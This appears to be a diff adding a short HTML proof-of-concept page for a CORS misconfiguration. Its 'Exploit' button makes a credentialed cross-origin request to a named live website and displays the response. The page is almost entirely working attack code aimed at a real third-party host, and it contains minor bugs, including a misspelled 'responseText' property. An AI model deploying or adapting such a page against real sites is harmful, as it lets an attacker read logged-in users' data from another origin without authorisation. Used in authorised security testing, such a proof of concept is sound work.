@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC<h2>
+<div id="test">
+<button type="button" onclick="cors() ">Exploit</button>
+ </div>
+<script> function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function()
+  {
+  	if(this.readyState == 4 && this.status == 200) {
+		document.getElementById("test").innerHTML = alert(this.resposeText);
+	}
+  };
+  xhttp.open("GET", "https://kr.ncsoft.com", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+</body>
+</html>
